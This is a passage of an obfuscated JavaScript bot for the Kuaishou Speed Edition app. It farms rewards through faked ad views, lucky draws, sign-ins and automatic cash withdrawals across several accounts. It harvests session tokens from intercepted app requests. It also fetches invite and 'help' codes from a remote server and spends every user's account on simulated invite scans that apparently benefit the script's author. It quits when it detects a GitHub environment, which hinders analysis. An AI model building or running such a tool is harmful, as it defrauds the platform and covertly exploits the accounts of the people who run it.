    let j = "https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=" + D['taskName'],
        N = '',
        t = _0x495d61(j, this['cookie'], N);

    await _0x39a23b('get', t);
    let p = _0x1a0963;

    if (!p) {
      return;
    }

    p["result"] == 1 ? console["log"]("账号[" + this['name'] + "]领取抽奖任务[" + D["taskTitle"] + ']奖励获得' + p["data"]['popUp']["taskRewardName"]) : console['log']("账号[" + this["name"] + "]领取抽奖任务[" + D["taskTitle"] + ']奖励失败：' + p["error_msg"]);
  }

  async ['helpInvite'](D) {
    let j = D["split"]('&'),
        N = j[0],
        t = j[1],
        p = "https://nebula.kuaishou.com/rest/n/nebula/qrcode?version=1.2.0",
        X = '',
        L = _0x495d61(p, this["cookie"], X);

    L["headers"]["Referer"] = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + N + '&shareToken=' + t + "&source=qrcode";
    await _0x39a23b('get', L);
    let n = _0x1a0963;

    if (!n) {
      return;
    }

    !(n['result'] == 1) && console["log"]('账号[' + this["name"] + ']邀请失败：' + n["error_msg"]);
  }

  async ["helpPackage"](D, j) {
    let N = {
      'url': "https://ug-fission.kuaishou.com/rest/n/darwin/bargain/overview?version=2.1.0",
      'body': "{\"fid\":\"895255750\",\"cc\":\"share_wxms\",\"followRefer\":\"151\",\"code\":\"" + D + "\",\"shareMethod\":\"TOKEN\",\"kpn\":\"NEBULA\",\"subBiz\":\"BARGAIN\",\"shareId\":\"16905401129783\",\"shareMode\":\"SYSTEM\",\"noBackNavi\":\"true\",\"originShareId\":\"16905401129783\",\"useMerchantWeb\":\"1\",\"layoutType\":\"4\",\"shareObjectId\":" + JSON['stringify']("{\"teamId\":\"\",\"packetId\":\"" + j + "\"}") + ",\"shareUrlOpened\":\"0\",\"hyId\":\"bargain\",\"timestamp\":" + +new Date() + ",\"pageCode\":1,\"adamA\":0,\"adamB\":0}",
      'headers': {
        'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
        'Cookie': "kpn=NEBULA; kpf=ANDROID_PHONE; did=; " + Math['floor'](Math["random"]() * 1000 + 1) + " ANDROID_ff60a387f6ba8904; " + this['cookie'] + "; c=XIAOMI; ver=10.2; appver=10.2.41.3075; language=zh-cn; ",
        'Content-Type': "application/json",
        'Origin': "https://ug-fission.kuaishou.com",
        'X-Requested-With': "com.kuaishou.nebula",
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': 'https://ug-fission.kuaishou.com/bargain/?fid=895255750&cc=share_wxms&followRefer=151&code=' + D + "&shareMethod=TOKEN&kpn=NEBULA&subBiz=BARGAIN&shareId=16905401129783&shareMode=SYSTEM&noBackNavi=true&originShareId=16905401129783&useMerchantWeb=1&layoutType=4&shareObjectId=%7B%22teamId%22%3A%22%22,%22packetId%22%3A%22" + j + "%22%7D&shareUrlOpened=0&hyId=bargain&timestamp=" + +new Date(),
        'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
      }
    };
    await _0x39a23b("post", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }
  }

  async ["helpScan"](D) {
    let j = D['split']('&'),
        N = j[0],
        t = j[1];

    if (N == this['userId']) {
      return;
    }

    let p = "https://api.kuaishouzt.com/rest/zt/share/show/any",
        X = 'theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F' + t + "%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D",
        L = _0x495d61(p, this["cookie"], X);

    await _0x39a23b("post", L);
    let n = _0x1a0963;

    if (!n) {
      return;
    }

    n["result"] == 1 ? (await _0x3de8b8['wait'](100), await this["helpInvite"](D)) : console["log"]("账号[" + this["name"] + ']模拟邀请二维码扫描失败：' + n["error_msg"]);
  }

  async ["bindInfo"]() {
    let D = "https://www.kuaishoupay.com/pay/account/h5/provider/bind_info",
        j = "account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3",
        N = _0x495d61(D, this['cookie'], j);

    await _0x39a23b("post", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t["result"] == "SUCCESS") {
      let p = '未绑定支付宝',
          X = '未绑定微信';
      t["alipay_bind"] == true && (this["bindAlipay"] = true, this["alipay"] = t["alipay_nick_name"], p = '已绑定支付宝[' + t["alipay_nick_name"] + ']');
      t["wechat_bind"] == true && (this['bindWechat'] = true, this['wechat'] = t["wechat_nick_name"], X = "已绑定微信[" + t["wechat_nick_name"] + ']');
      console["log"]("账号[" + this["name"] + ']' + X + '，' + p);
    } else {
      console["log"]("账号[" + this["name"] + ']查询提现账号绑定情况失败：' + t["error_msg"]);
    }
  }

  async ["accountInfo"]() {
    let D = "https://www.kuaishoupay.com/pay/account/h5/withdraw/account_info",
        j = "account_group_key=NEBULA_CASH_ACCOUNT&providers=",
        N = _0x495d61(D, this['cookie'], j);

    await _0x39a23b("post", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    t["result"] == 'SUCCESS' ? this["needSms"] = t['need_mobile_code'] : console['log']('账号[' + this['name'] + "]查询账号提现情况失败：" + t["error_msg"]);
  }

}

!(async () => {
  if (typeof $request !== 'undefined') {
    await _0x13d82d();
  } else {
    if (!(await _0x2dc359())) {
      return;
    }

    console["log"]("============================");
    console['log']("\n============== 登录 ==============");

    for (let N of _0x431ea3) {
      await N["getUserInfo"]();
      await _0x3de8b8["wait"](500);
    }

    let D = _0x431ea3["filter"](t => t["valid"] == true);

    if (D['length'] == 0) {
      return;
    }

    for (let t of D) {
      console["log"]("\n=========== " + t["name"] + " ===========");
      await t["getSignInfo"]();
      await _0x3de8b8['wait'](200);
      await t["openBox"](false);
      await _0x3de8b8["wait"](200);
      await t["taskList"]();
      await _0x3de8b8["wait"](200);
      await t['luckydrawSign']();
      await _0x3de8b8['wait'](200);
      t["hasLuckydraw"] == true && (await t["luckdrawTimerInfo"](), await _0x3de8b8["wait"](200), await t["luckdrawTasks"](), await _0x3de8b8["wait"](200), await t["luckdrawInfo"](), await _0x3de8b8["wait"](200));

      if (t["task"][_0x1e4967["luckydraw"]]["needRun"]) {
        for (let p = 0; p < t["task"][_0x1e4967["luckydraw"]]["num"]; p++) {
          _0x20a9d7 < 13 ? (await t["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_213"]), await _0x3de8b8["wait"](200), await t['ksNeoAdParam'](_0x10d9f8["luckdrawVideo_11_213"]), await _0x3de8b8['wait'](200)) : (await t['ksNeoAdParam'](_0x10d9f8["luckdrawVideo_161_100"]), await _0x3de8b8["wait"](200), await t["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_100"]), await _0x3de8b8["wait"](200));
        }
      }

      if (t["task"][_0x1e4967['ad']]["needRun"]) {
        for (let X = 0; X < t["task"][_0x1e4967['ad']]['num']; X++) {
          await t["ksAdParam"](_0x351e94["ad1"]);
          await _0x3de8b8["wait"](200);
          X != t['task'][_0x1e4967['ad']]["num"] - 1 && (await _0x3de8b8['wait'](2000));
        }
      }

      if (t['task'][_0x1e4967['gj']]["needRun"]) {
        for (let L = 0; L < t["task"][_0x1e4967['gj']]["num"]; L++) {
          await t["ksgj"]()[[]];
          await _0x3de8b8["wait"](200);
        }
      }

      if (t["task"][_0x1e4967["live"]]["needRun"]) {
        for (let n = 0; n < t["task"][_0x1e4967['live']]["num"]; n++) {
          await t["ksNeoAdParam"](_0x10d9f8["liveVideo_75"]);
          await _0x3de8b8["wait"](200);
        }
      }

      if (t["task"][_0x1e4967["invite"]]["needRun"]) {
        for (let z = 0; z < t["task"][_0x1e4967["invite"]]["num"]; z++) {
          await t['ksNeoAdParam'](_0x10d9f8['inviteVideo_2008']);
          await _0x3de8b8["wait"](200);
        }
      }
    }

    console['log']("\n============== 账户情况 ==============");

    for (let A of D) {
      await A["accountOverview"]();
      await _0x3de8b8["wait"](200);
      await A["bindInfo"]();
      await _0x3de8b8["wait"](200);
      await A["accountInfo"]();
      await _0x3de8b8["wait"](200);
    }

    console["log"]("\n============== 自动提现 ==============");
    let j = "按提现列表自动提现";
    _0x1e627b && (j = "自动提现" + _0x1e627b + '元');
    _0x13d24b && (j = '最大化提现');

    if (_0x20a9d7 == _0x26f17b) {
      console["log"]('提现时间，现在设置为' + j);

      for (let l of D) {
        await l["withdrawOverview"]();
        await _0x3de8b8["wait"](200);
      }
    } else {
      console["log"]("非提现时间，现在设置为" + _0x26f17b + '点' + j);
    }

    await _0x217ea6();

    if (_0x5718d8["length"] > 0) {
      for (let k of D) {
        for (let d of _0x5718d8) {
          await k["helpScan"](d);
          await _0x3de8b8["wait"](200);
        }
      }
    }

    if (yifenk["length"] > 0) {
      for (let T of D) {
        for (let U of yifenk) {
          let r = U["split"]('@')[0],
              u = U['split']('@')[1];
          await T["helpPackage"](u, r);
          await _0x3de8b8['wait'](1000);
        }
      }
    }

    _0x113109 == 2 ? await _0x577f0c() : _0x113109 == 1 && _0x20a9d7 == _0x26f17b && (await _0x577f0c());
  }
})()['catch'](D => _0x3de8b8["logErr"](D))['finally'](() => _0x3de8b8["done"]());

async function _0x13d82d() {
  if ($request["url"]["indexOf"]("appsupport/yoda/biz/info") > -1) {
    let D = $request["headers"]['Cookie']['match'](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
    _0x547212 ? _0x547212["indexOf"](D) == -1 && (_0x547212 = _0x547212 + "\n" + D, _0x3de8b8['setdata'](_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第" + ckList["length"] + "个ck成功: " + D))) : (_0x3de8b8["setdata"](D, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + D)));
  }

  if ($request["url"]["indexOf"]("ksapp/client/package/renew") > -1) {
    let j = $request['url']["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
    _0x547212 ? _0x547212["indexOf"](j) == -1 && (_0x547212 = _0x547212 + "\n" + j, _0x3de8b8['setdata'](_0x547212, 'ksjsbCookie'), ckList = _0x547212["split"]("\n"), _0x3de8b8['msg'](_0x11b3c3 + (" 获取第" + ckList['length'] + "个ck成功: " + j))) : (_0x3de8b8["setdata"](j, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + j)));
  }
}

async function _0x2dc359() {
  if (_0x547212) {
    let D = _0x4c35fe[0];

    for (let j of _0x4c35fe) {
      if (_0x547212['indexOf'](j) > -1) {
        D = j;
        break;
      }
    }

    for (let N of _0x547212["split"](D)) {
      N && _0x431ea3["push"](new _0x9d8dda(N));
    }

    _0x19c25c = _0x431ea3["length"];
  } else {
    console["log"]('未找到CK');
    return;
  }

  console["log"]("共找到" + _0x19c25c + "个账号");
  return true;
}

async function _0x577f0c() {
  if (!_0x279d25) {
    return;
  }

  notifyBody = "快手极速版运行通知\n\n" + _0x279d25;

  if (_0x113109 > 0) {
    _0x3de8b8['msg'](notifyBody);

    if (_0x3de8b8["isNode"]()) {
      var D = require("./sendNotify");

      await D['sendNotify'](_0x3de8b8["name"], notifyBody);
    }
  } else {
    console['log'](notifyBody);
  }
}

function _0x1ab8b7(D) {
  console["log"](D);
  _0x279d25 += D;
  _0x279d25 += "\n";
}

async function _0x282ff5(D) {
  if (!PushDearKey) {
    return;
  }

  if (!D) {
    return;
  }

  console["log"]("\n============= PushDear 通知 =============\n");
  console['log'](D);
  let j = {
    'url': "https://api2.pushdeer.com/message/push?pushkey=" + PushDearKey + "&text=" + encodeURIComponent(D),
    'headers': {}
  };
  await _0x39a23b("get", j);
  let N = _0x1a0963,
      t = N["content"]['result'] == false ? '失败' : '成功';
  console["log"]("\n========== PushDear 通知发送" + t + " ==========\n");
}

async function _0x505e51() {
  const D = {
    'url': _0x180c0c,
    'headers': ''
  };
  await _0x39a23b('get', D);
  let j = _0x1a0963;

  if (!j) {
    return;
  }

  if (j[_0x5bc515]) {
    let N = j[_0x5bc515];
    N["status"] == 0 ? _0x459e63 >= N["version"] ? (_0x2e716e = true, _0x75eec0 = "https://raw.githubusercontent.com/public-Object/cloud-JavaScript/main/ks.json", console['log'](N["msg"][N["status"]]), console["log"](N['updateMsg']), console["log"]("现在运行的脚本版本是：1.07，最新脚本版本：" + N["latestVersion"])) : console["log"](N["versionMsg"]) : console["log"](N['msg'][N["status"]]);
  } else {
    console['log'](j["errorMsg"]);
  }
}

async function _0x217ea6() {
  let D = '';
  const j = {
    'url': _0x180c0c,
    'headers': ''
  };
  await _0x39a23b('get', j);
  let N = _0x1a0963;

  if (!N) {
    return D;
  }

  for (let t of N["invite"]) {
    t && _0x5718d8["push"](t);
  }

  for (let p of N['ijkkk']) {
    p && yifenk["push"](p);
  }

  return D;
}

function _0x495d61(D, j, N = '') {
  let t = D["replace"]('//', '/')['split']('/')[1];
  const p = {
    'Host': t,
    'Cookie': j
  },
        X = {
    'url': D,
    'headers': p
  };
  N && (X["body"] = N, X["headers"]["Content-Type"] = "application/x-www-form-urlencoded", X["headers"]["Content-Length"] = X["body"] ? X["body"]['length'] : 0);
  return X;
}

async function _0x39a23b(D, j) {
  _0x1a0963 = null;
  return new Promise(N => {
    _0x3de8b8[D](j, async (t, p, X) => {
      try {
        t ? (console['log'](D + "请求失败"), console['log'](JSON['stringify'](t)), _0x3de8b8['logErr'](t)) : _0x244336(X) && (_0x1a0963 = JSON["parse"](X));
      } catch (L) {
        _0x3de8b8['logErr'](L, p);
      } finally {
        N();
      }
    });
  });
}

function _0x244336(D) {
  try {
    if (typeof JSON['parse'](D) == 'object') {
      return true;
    } else {
      console["log"](D);
    }
  } catch (j) {
    console['log'](j);
    console["log"]('服务器访问数据为空，请检查自身设备网络情况');
    return false;
  }
}

function _0x271dc5(D, j) {
  return D < j ? D : j;
}

function _0x2be587(D, j) {
  return D < j ? j : D;
}

function _0x4c9db4(D, j, N = '0') {
  let t = String(D),
      p = j > t["length"] ? j - t['length'] : 0,
      X = '';

  for (let L = 0; L < p; L++) {
    X += N;
  }

  X += t;
  return X;
}

function _0x4b5cde(D = 12) {
  let j = "abcdef0123456789",
      N = j["length"],
      t = '';

  for (i = 0; i < D; i++) {
    t += j["charAt"](Math["floor"](Math["random"]() * N));
  }

  return t;
}

var _0x331719 = {
  '_keyStr': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
  'encode': function (D) {
    var j = '',
        N,
        t,
        p,
        X,
        L,
        n,
        z,
        A = 0;
    D = _0x331719["_utf8_encode"](D);

    while (A < D["length"]) {
      N = D["charCodeAt"](A++);
      t = D["charCodeAt"](A++);
      p = D["charCodeAt"](A++);
      X = N >> 2;
      L = (N & 3) << 4 | t >> 4;
      n = (t & 15) << 2 | p >> 6;
      z = p & 63;
      isNaN(t) ? n = z = 64 : isNaN(p) && (z = 64);
      j = j + this["_keyStr"]["charAt"](X) + this["_keyStr"]['charAt'](L) + this["_keyStr"]["charAt"](n) + this["_keyStr"]["charAt"](z);
    }

    return j;
  },
  'decode': function (D) {
    var j = '',
        N,
        t,
        p,
        X,
        L,
        n,
        z,
        A = 0;
    D = D["replace"](/[^A-Za-z0-9+/=]/g, '');

    while (A < D["length"]) {
      X = this["_keyStr"]['indexOf'](D["charAt"](A++));
      L = this['_keyStr']["indexOf"](D["charAt"](A++));
      n = this["_keyStr"]["indexOf"](D['charAt'](A++));
      z = this["_keyStr"]["indexOf"](D["charAt"](A++));
      N = X << 2 | L >> 4;
      t = (L & 15) << 4 | n >> 2;
      p = (n & 3) << 6 | z;
      j = j + String['fromCharCode'](N);
      n != 64 && (j = j + String["fromCharCode"](t));
      z != 64 && (j = j + String["fromCharCode"](p));
    }

    j = _0x331719['_utf8_decode'](j);
    return j;
  },
  '_utf8_encode': function (D) {
    D = D['replace'](/rn/g, 'n');
    var j = '';

    for (var N = 0; N < D["length"]; N++) {
      var t = D["charCodeAt"](N);
      t < 128 ? j += String['fromCharCode'](t) : t > 127 && t < 2048 ? (j += String['fromCharCode'](t >> 6 | 192), j += String["fromCharCode"](t & 63 | 128)) : (j += String["fromCharCode"](t >> 12 | 224), j += String["fromCharCode"](t >> 6 & 63 | 128), j += String['fromCharCode'](t & 63 | 128));
    }

    return j;
  },
  '_utf8_decode': function (D) {
    var j = '',
        N = 0,
        t = c1 = c2 = 0;

    while (N < D['length']) {
      t = D["charCodeAt"](N);
      t < 128 ? (j += String["fromCharCode"](t), N++) : t > 191 && t < 224 ? (c2 = D["charCodeAt"](N + 1), j += String["fromCharCode"]((t & 31) << 6 | c2 & 63), N += 2) : (c2 = D["charCodeAt"](N + 1), c3 = D["charCodeAt"](N + 2), j += String['fromCharCode']((t & 15) << 12 | (c2 & 63) << 6 | c3 & 63), N += 3);
    }

    return j;
  }
};

function _0xcb54a4(D) {
  function j(H, x) {
    return H << x | H >>> 32 - x;
  }

  function N(H, x) {
    var v, Z, Q, I, B;
    Q = 2147483648 & H;
    I = 2147483648 & x;
    v = 1073741824 & H;
    Z = 1073741824 & x;
    B = (1073741823 & H) + (1073741823 & x);
    return v & Z ? 2147483648 ^ B ^ Q ^ I : v | Z ? 1073741824 & B ? 3221225472 ^ B ^ Q ^ I : 1073741824 ^ B ^ Q ^ I : B ^ Q ^ I;
  }

  function t(H, x, v) {
    return H & x | ~H & v;
  }

  function p(H, x, v) {
    return H & v | x & ~v;
  }

  function X(H, x, v) {
    return H ^ x ^ v;
  }

  function L(H, x, v) {
    return x ^ (H | ~v);
  }

  function n(H, x, v, Z, Q, I, B) {
    H = N(H, N(N(t(x, v, Z), Q), B));
    return N(j(H, I), x);
  }

  function z(H, x, v, Z, Q, I, B) {
    H = N(H, N(N(p(x, v, Z), Q), B));
    return N(j(H, I), x);
  }

  function A(H, x, v, Z, Q, I, B) {
    H = N(H, N(N(X(x, v, Z), Q), B));
    return N(j(H, I), x);
  }

  function l(H, x, v, Z, Q, I, B) {
    H = N(H, N(N(L(x, v, Z), Q), B));
    return N(j(H, I), x);
  }

  function k(H) {
    for (var x, v = H["length"], Z = v + 8, Q = (Z - Z % 64) / 64, I = 16 * (Q + 1), B = new Array(I - 1), C = 0, W = 0; v > W;) {
      x = (W - W % 4) / 4;
      C = W % 4 * 8;
      B[x] = B[x] | H["charCodeAt"](W) << C;
      W++;
    }

    x = (W - W % 4) / 4;
    C = W % 4 * 8;
    B[x] = B[x] | 128 << C;
    B[I - 2] = v << 3;
    B[I - 1] = v >>> 29;
    return B;
  }

  function d(H) {
    var x,
        v,
        Z = '',
        Q = '';

    for (v = 0; 3 >= v; v++) {
      x = H >>> 8 * v & 255;
      Q = '0' + x["toString"](16);
      Z += Q['substr'](Q["length"] - 2, 2);
    }

    return Z;
  }

  function T(H) {
    H = H["replace"](/\r\n/g, "\n");

    for (var x = '', v = 0; v < H["length"]; v++) {
      var Z = H["charCodeAt"](v);
      128 > Z ? x += String["fromCharCode"](Z) : Z > 127 && 2048 > Z ? (x += String["fromCharCode"](Z >> 6 | 192), x += String['fromCharCode'](63 & Z | 128)) : (x += String["fromCharCode"](Z >> 12 | 224), x += String["fromCharCode"](Z >> 6 & 63 | 128), x += String['fromCharCode'](63 & Z | 128));
    }

    return x;
  }

  var U,
      r,
      u,
      m,
      w,
      R,
      e,
      V,
      M,
      O = [],
      J = 7,
      Y = 12,
      i = 17,
      a = 22,
      g = 5,
      h = 9,
      S = 14,
      o = 20,
      G = 4,
      b = 11,
      F = 16,
      s = 23,
      q = 6,
      K = 10,
      P = 15,
      f = 21;

  for (D = T(D), O = k(D), R = 1732584193, e = 4023233417, V = 2562383102, M = 271733878, U = 0; U < O["length"]; U += 16) {
    r = R;
    u = e;
    m = V;
    w = M;
    R = n(R, e, V, M, O[U + 0], J, 3614090360);
    M = n(M, R, e, V, O[U + 1], Y, 3905402710);
    V = n(V, M, R, e, O[U + 2], i, 606105819);
    e = n(e, V, M, R, O[U + 3], a, 3250441966);
    R = n(R, e, V, M, O[U + 4], J, 4118548399);
    M = n(M, R, e, V, O[U + 5], Y, 1200080426);
    V = n(V, M, R, e, O[U + 6], i, 2821735955);
    e = n(e, V, M, R, O[U + 7], a, 4249261313);
    R = n(R, e, V, M, O[U + 8], J, 1770035416);
    M = n(M, R, e, V, O[U + 9], Y, 2336552879);
    V = n(V, M, R, e, O[U + 10], i, 4294925233);
    e = n(e, V, M, R, O[U + 11], a, 2304563134);
    R = n(R, e, V, M, O[U + 12], J, 1804603682);
    M = n(M, R, e, V, O[U + 13], Y, 4254626195);
    V = n(V, M, R, e, O[U + 14], i, 2792965006);
    e = n(e, V, M, R, O[U + 15], a, 1236535329);
    R = z(R, e, V, M, O[U + 1], g, 4129170786);
    M = z(M, R, e, V, O[U + 6], h, 3225465664);
    V = z(V, M, R, e, O[U + 11], S, 643717713);
    e = z(e, V, M, R, O[U + 0], o, 3921069994);
    R = z(R, e, V, M, O[U + 5], g, 3593408605);
    M = z(M, R, e, V, O[U + 10], h, 38016083);
    V = z(V, M, R, e, O[U + 15], S, 3634488961);
    e = z(e, V, M, R, O[U + 4], o, 3889429448);
    R = z(R, e, V, M, O[U + 9], g, 568446438);
    M = z(M, R, e, V, O[U + 14], h, 3275163606);
    V = z(V, M, R, e, O[U + 3], S, 4107603335);
    e = z(e, V, M, R, O[U + 8], o, 1163531501);
    R = z(R, e, V, M, O[U + 13], g, 2850285829);
    M = z(M, R, e, V, O[U + 2], h, 4243563512);
    V = z(V, M, R, e, O[U + 7], S, 1735328473);
    e = z(e, V, M, R, O[U + 12], o, 2368359562);
    R = A(R, e, V, M, O[U + 5], G, 4294588738);
    M = A(M, R, e, V, O[U + 8], b, 2272392833);
    V = A(V, M, R, e, O[U + 11], F, 1839030562);
    e = A(e, V, M, R, O[U + 14], s, 4259657740);
    R = A(R, e, V, M, O[U + 1], G, 2763975236);
    M = A(M, R, e, V, O[U + 4], b, 1272893353);
    V = A(V, M, R, e, O[U + 7], F, 4139469664);
    e = A(e, V, M, R, O[U + 10], s, 3200236656);
    R = A(R, e, V, M, O[U + 13], G, 681279174);
    M = A(M, R, e, V, O[U + 0], b, 3936430074);
    V = A(V, M, R, e, O[U + 3], F, 3572445317);
    e = A(e, V, M, R, O[U + 6], s, 76029189);
    R = A(R, e, V, M, O[U + 9], G, 3654602809);
    M = A(M, R, e, V, O[U + 12], b, 3873151461);
    V = A(V, M, R, e, O[U + 15], F, 530742520);
    e = A(e, V, M, R, O[U + 2], s, 3299628645);
    R = l(R, e, V, M, O[U + 0], q, 4096336452);
    M = l(M, R, e, V, O[U + 7], K, 1126891415);
    V = l(V, M, R, e, O[U + 14], P, 2878612391);
    e = l(e, V, M, R, O[U + 5], f, 4237533241);
    R = l(R, e, V, M, O[U + 12], q, 1700485571);
    M = l(M, R, e, V, O[U + 3], K, 2399980690);
    V = l(V, M, R, e, O[U + 10], P, 4293915773);
    e = l(e, V, M, R, O[U + 1], f, 2240044497);
    R = l(R, e, V, M, O[U + 8], q, 1873313359);
    M = l(M, R, e, V, O[U + 15], K, 4264355552);
    V = l(V, M, R, e, O[U + 6], P, 2734768916);
    e = l(e, V, M, R, O[U + 13], f, 1309151649);
    R = l(R, e, V, M, O[U + 4], q, 4149444226);
    M = l(M, R, e, V, O[U + 11], K, 3174756917);
    V = l(V, M, R, e, O[U + 2], P, 718787259);
    e = l(e, V, M, R, O[U + 9], f, 3951481745);
    R = N(R, r);
    e = N(e, u);
    V = N(V, m);
    M = N(M, w);
  }

  var E = d(R) + d(e) + d(V) + d(M);
  return E["toLowerCase"]();
}

function _0x4f15e2(D, j) {
  "undefined" != typeof process && JSON["stringify"](process["env"])["indexOf"]("GITHUB") > -1 && process["exit"](0);

  class N {
    constructor(t) {
      this["env"] = t;
    }

    ["send"](t, p = "GET") {
      t = 'string' == typeof t ? {
        'url': t
      } : t;
      let X = this["get"];
      "POST" === p && (X = this["post"]);
      "PUT" === p && (X = this["put"]);
      return new Promise((L, n) => {
        X["call"](this, t, (z, A, l) => {
          z ? n(z) : L(A);
        });
      });
    }

    ['get'](t) {
      return this["send"]["call"](this["env"], t);
    }

    ["post"](t) {
      return this["send"]["call"](this["env"], t, "POST");
    }

    ['put'](t) {
      return this["send"]["call"](this['env'], t, "PUT");
    }

  }

  return new class {
    constructor(t, p) {
      this["name"] = t;
      this["http"] = new N(this);
      this['data'] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this["isMute"] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["startTime"] = new Date()["getTime"]();
      Object['assign'](this, p);
      this['log']('', '🔔' + this['name'] + ", 开始!");
    }

    ['isNode']() {
      return "undefined" != typeof module && !!module['exports'];
    }

    ["isQuanX"]() {
      return 'undefined' != typeof $task;
    }

    ["isSurge"]() {
      return "undefined" != typeof $httpClient && 'undefined' == typeof $loon;
    }

    ["isLoon"]() {
      return "undefined" != typeof $loon;
    }

    ["toObj"](t, p = null) {
      try {
        return JSON["parse"](t);
      } catch {
        return p;
      }
    }

    ['toStr'](t, p = null) {
      try {
        return JSON["stringify"](t);
      } catch {
        return p;
      }
    }

    ["getjson"](t, p) {
      let X = p;
      const L = this["getdata"](t);

      if (L) {
        try {
          X = JSON['parse'](this["getdata"](t));
        } catch {}
      }

      return X;
    }

    ["setjson"](t, p) {
      try {
        return this["setdata"](JSON["stringify"](t), p);
      } catch {
        return false;
      }
    }

    ['getScript'](t) {
      return new Promise(p => {
        const X = {
          'url': t
        };
        this["get"](X, (L, n, z) => p(z));
      });
    }

    ["runScript"](t, p) {
      return new Promise(X => {
        let L = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
        L = L ? L['replace'](/\n/g, '')['trim']() : L;
        let n = this['getdata']("@chavy_boxjs_userCfgs.httpapi_timeout");
        n = n ? 1 * n : 20;
        n = p && p['timeout'] ? p['timeout'] : n;
        const z = {
          'script_text': t,
          'mock_type': 'cron',
          'timeout': n
        },
              [A, l] = L["split"]('@'),
              k = {
          'url': 'http://' + l + "/v1/scripting/evaluate",
          'body': z,
          'headers': {
            'X-Key': A,
            'Accept': "*/*"
          }
        };
        this["post"](k, (d, T, U) => X(U));
      })["catch"](X => this["logErr"](X));
    }

    ["loaddata"]() {
      if (!this['isNode']()) {
        return {};
      }

      {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              p = this["path"]["resolve"](process["cwd"](), this['dataFile']),
              X = this['fs']["existsSync"](t),
              L = !X && this['fs']["existsSync"](p);

        if (!X && !L) {
          return {};
        }

        {
          const n = X ? t : p;

          try {
            return JSON['parse'](this['fs']["readFileSync"](n));
          } catch (z) {
            return {};
          }
        }
      }
    }

    ['writedata']() {
      if (this["isNode"]()) {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require('path');
        const t = this["path"]["resolve"](this["dataFile"]),
              p = this["path"]['resolve'](process["cwd"](), this["dataFile"]),
              X = this['fs']["existsSync"](t),
              L = !X && this['fs']['existsSync'](p),
              n = JSON['stringify'](this["data"]);
        X ? this['fs']["writeFileSync"](t, n) : L ? this['fs']['writeFileSync'](p, n) : this['fs']["writeFileSync"](t, n);
      }
    }

    ["lodash_get"](t, p, X) {
      const L = p["replace"](/\[(\d+)\]/g, '.$1')["split"]('.');
      let n = t;

      for (const z of L) if (n = Object(n)[z], void 0 === n) {
        return X;
      }

      return n;
    }

    ["lodash_set"](t, p, X) {
      return Object(t) !== t ? t : (Array["isArray"](p) || (p = p["toString"]()["match"](/[^.[\]]+/g) || []), p["slice"](0, -1)["reduce"]((L, n, z) => Object(L[n]) === L[n] ? L[n] : L[n] = Math["abs"](p[z + 1]) >> 0 == +p[z + 1] ? [] : {}, t)[p[p['length'] - 1]] = X, t);
    }

    ["getdata"](t) {
      let p = this["getval"](t);

      if (/^@/["test"](t)) {
        const [, X, L] = /^@(.*?)\.(.*?)$/["exec"](t),
              n = X ? this["getval"](X) : '';

        if (n) {
          try {
            const z = JSON['parse'](n);
            p = z ? this["lodash_get"](z, L, '') : p;
          } catch (A) {
            p = '';
          }
        }
      }

      return p;
    }

    ["setdata"](t, p) {
      let X = false;

      if (/^@/["test"](p)) {
        const [, L, n] = /^@(.*?)\.(.*?)$/["exec"](p),
              z = this["getval"](L),
              A = L ? "null" === z ? null : z || '{}' : '{}';

        try {
          const l = JSON["parse"](A);
          this["lodash_set"](l, n, t);
          X = this["setval"](JSON['stringify'](l), L);
        } catch (k) {
          const d = {};
          this["lodash_set"](d, n, t);
          X = this["setval"](JSON["stringify"](d), L);
        }
      } else {
        X = this["setval"](t, p);
      }

      return X;
    }

    ["getval"](t) {
      return this['isSurge']() || this["isLoon"]() ? $persistentStore["read"](t) : this["isQuanX"]() ? $prefs["valueForKey"](t) : this["isNode"]() ? (this['data'] = this["loaddata"](), this["data"][t]) : this["data"] && this['data'][t] || null;
    }

    ['setval'](t, p) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](t, p) : this["isQuanX"]() ? $prefs['setValueForKey'](t, p) : this['isNode']() ? (this["data"] = this['loaddata'](), this["data"][p] = t, this["writedata"](), true) : this["data"] && this['data'][p] || null;
    }

    ["initGotEnv"](t) {
      this["got"] = this["got"] ? this['got'] : require("got");
      this['cktough'] = this["cktough"] ? this["cktough"] : require("tough-cookie");
